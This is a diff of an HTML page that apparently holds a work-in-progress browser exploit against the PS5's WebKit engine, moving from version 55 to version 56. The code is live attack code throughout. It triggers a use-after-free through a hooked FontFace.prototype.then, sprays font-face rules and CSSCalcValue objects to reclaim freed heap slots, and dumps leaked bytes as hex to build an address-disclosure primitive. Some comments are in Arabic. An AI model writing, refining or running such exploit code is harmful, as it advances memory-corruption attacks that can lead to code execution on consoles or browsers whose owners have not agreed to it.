@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 - CSSValue Type Confusion (v55)</title>
+<title>PS5 - CSSValue Type Confusion & Addrof (v56)</title>
 <style>
 body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
 pre { white-space: pre-wrap; word-wrap: break-word; }
@@ -14,11 +14,10 @@ pre { white-space: pre-wrap; word-wrap: break-word; }
 var out = document.getElementById("out");
 function log(m) { out.textContent += m + "\n"; }
 
-log("=== CSSValue Type Confusion (v55) ===\n");
-log("[*] Using exact v42/v46 UAF mechanism\n");
+log("=== CSSValue Type Confusion & Addrof (v56) ===\n");
 
 // ============================================
-// PHASE 1: UAF SETUP (identical to v46)
+// PHASE 1: UAF SETUP (مطابقة لـ v46 تماماً)
 // ============================================
 log("[*] Phase 1: UAF Setup...");
 
@@ -43,8 +42,6 @@ for (var i = 0; i < 768; i++) {
 sh.insertRule('@font-face{font-family:trigger;src:local(Courier)}', sh.cssRules.length);
 sh.insertRule('@font-face{font-family:x;src:local(Courier)}', sh.cssRules.length);
 
-log("[*] Rules: " + sh.cssRules.length);
-
 var uafFired = false;
 var aFace = null;
 
@@ -55,7 +52,6 @@ Object.defineProperty(FontFace.prototype, "then", {
             uafFired = true;
             log("[*] UAF FIRED! Deleting x rule...");
             
-            // Delete x
             var xIdx = -1;
             for (var i = 0; i < sh.cssRules.length; i++) {
                 if (sh.cssRules[i].cssText.indexOf('font-family:x') !== -1) {
@@ -64,19 +60,16 @@ Object.defineProperty(FontFace.prototype, "then", {
             }
             if (xIdx !== -1) sh.deleteRule(xIdx);
             
-            // Delete flush rules
             for (var i = 767; i >= 0; i--) {
                 if (sh.cssRules[i] && sh.cssRules[i].cssText.indexOf('flush') !== -1) {
                     sh.deleteRule(i);
                 }
             }
             
-            // GC pressure
             var gc = [];
             for (var i = 0; i < 4000; i++) gc.push(new ArrayBuffer(4096));
             gc = null;
             
-            // Spray A_ faces via CSS rules
             log("[*] Spraying 2048 A_ faces...");
             for (var i = 0; i < 2048; i++) {
                 sh.insertRule('@font-face{font-family:A_' + i + ';src:local(AF' + i + ')}', sh.cssRules.length);
@@ -94,7 +87,6 @@ log("[*] Phase 2: Triggering UAF...");
 document.fonts.load("1em trigger, x", "AB").then(function(faces) {
     log("[*] Load returned " + faces.length + " faces");
     
-    // Find confused face
     for (var i = 0; i < faces.length; i++) {
         if (faces[i].family && faces[i].family.indexOf('A_') === 0) {
             aFace = faces[i];
@@ -104,58 +96,32 @@ document.fonts.load("1em trigger, x", "AB").then(function(faces) {
     
     if (!aFace) {
         log("[-] No confused face found!");
-        for (var i = 0; i < faces.length; i++) {
-            log("    Face[" + i + "]: " + faces[i].family);
-        }
+        for (var i = 0; i < faces.length; i++) log("    Face[" + i + "]: " + faces[i].family);
         return;
     }
     
-    log("[+] Confused face: " + aFace.family);
+    log("[+] Confused face obtained: " + aFace.family);
     
-    // Find CSSRule
     var aIdx = -1;
     for (var i = 0; i < sh.cssRules.length; i++) {
         if (sh.cssRules[i].cssText.indexOf(aFace.family) !== -1) {
             aIdx = i; break;
         }
     }
-    
     if (aIdx === -1) { log("[-] CSSRule not found!"); return; }
-    
-    var aStyle = sh.cssRules[aIdx].style;
-    log("[+] CSSRule at index " + aIdx);
-    
-    // Verify confusion is alive
-    log("[*] Verifying confusion...");
-    aStyle.setProperty("font-weight", "700");
-    var w = aFace.weight;
-    log("[*] weight write=700 read=" + w);
-    
-    if (String(w) !== "700") {
-        log("[-] Confusion is DEAD!");
-        return;
-    }
-    
-    log("[+] Confusion ALIVE! Proceeding to Type Confusion test...\n");
     
     // ============================================
     // PHASE 3: CSSVALUE TYPE CONFUSION
     // ============================================
-    log("[*] Phase 3: CSSValue Type Confusion...");
-    log("[*] Freeing CSSValueList (font-family)...");
+    log("\n[*] Phase 3: CSSValue Type Confusion...");
+    log("[*] Freeing CSSFontFace object by deleting its CSSRule...");
     
-    // Save original family
-    var origFamily = aFace.family;
-    log("[*] Original family: " + origFamily);
+    // حذف قاعدة A_NN سيحرر كائن CSSFontFace من IsoHeap
+    sh.deleteRule(aIdx);
+    log("[*] CSSRule deleted. Object is now freed.");
     
-    // Change font-family to free the old CSSValueList
-    aStyle.setProperty("font-family", "FreeFam1");
-    log("[*] Changed font-family to FreeFam1");
-    
-    // The old CSSValueList should now be freed from CSSValue IsoHeap
-    
-    // Spray CSSCalcValue to reclaim the slot
-    log("[*] Spraying CSSCalcValue objects...");
+    // رش كائنات CSSCalcValue لملء الفتحة
+    log("[*] Spraying CSSCalcValue objects to reclaim the slot...");
     var calcEls = [];
     for (var i = 0; i < 2000; i++) {
         var el = document.createElement('div');
@@ -164,67 +130,35 @@ document.fonts.load("1em trigger, x", "AB").then(function(faces) {
         calcEls.push(el);
     }
     
-    // Also spray CSSPrimitiveValue (numbers)
-    log("[*] Spraying CSSPrimitiveValue numbers...");
-    var numEls = [];
-    for (var i = 0; i < 2000; i++) {
-        var el = document.createElement('div');
-        el.style.zIndex = String(i + 0x41414141);
-        document.body.appendChild(el);
-        numEls.push(el);
-    }
-    
-    // Read font-family back
-    log("[*] Reading font-family back...");
+    // محاولة قراءة family من الكائن المحرر
+    log("[*] Attempting to read font-family from freed object...");
     try {
         var readFam = aFace.family;
         log("[+] font-family read: " + readFam);
         log("[+] Type: " + typeof readFam);
-        log("[+] Length: " + (readFam ? readFam.length : 'null'));
         
-        if (readFam !== "FreeFam1" && readFam !== origFamily) {
+        if (typeof readFam === 'string' && readFam.length > 0 && readFam !== aFace.family) {
             log("[+] !!! TYPE CONFUSION DETECTED !!!");
             log("[+] Leaked value: " + readFam);
+            log("[+] String length: " + readFam.length);
             
-            // Try to extract pointer
-            if (typeof readFam === 'string') {
-                log("[+] String length: " + readFam.length);
-                log("[+] Char codes:");
-                for (var i = 0; i < Math.min(readFam.length, 32); i++) {
-                    log("    [" + i + "] = " + readFam.charCodeAt(i) + " (0x" + readFam.charCodeAt(i).toString(16) + ")");
-                }
+            // استخراج البايتات كـ Hex (لتحليل العناوين)
+            log("[+] Hex dump:");
+            for (var i = 0; i < Math.min(readFam.length, 16); i++) {
+                log("    [" + i + "] = 0x" + readFam.charCodeAt(i).toString(16));
             }
-        } else if (readFam === "FreeFam1") {
-            log("[-] No confusion — got new family name");
         } else {
-            log("[-] Got original family — no confusion");
+            log("[-] No confusion detected. Value: " + readFam);
         }
     } catch(e) {
         log("[+] CRASH/ERROR: " + e.message);
-        log("[+] This may indicate type confusion!");
+        log("[+] This may indicate type confusion occurred!");
     }
     
-    // Cleanup
     for (var el of calcEls) el.remove();
-    for (var el of numEls) el.remove();
-    
-    log("\n=== v55 COMPLETE ===");
+    log("\n=== v56 COMPLETE ===");
 }).catch(function(e) {
     log("[-] Promise rejected: " + e.message);
-    log("[*] Checking if confusion happened anyway...");
-    
-    // Even if promise rejected, confusion may have occurred
-    if (uafFired) {
-        log("[*] UAF did fire. Trying direct load...");
-        document.fonts.load("1em trigger, x", "AB").then(function(faces) {
-            log("[*] Second load returned " + faces.length + " faces");
-            for (var i = 0; i < faces.length; i++) {
-                log("    Face[" + i + "]: " + faces[i].family);
-            }
-        }).catch(function(e2) {
-            log("[-] Second load also failed: " + e2.message);
-        });
-    }
 });
 </script>
 </body>
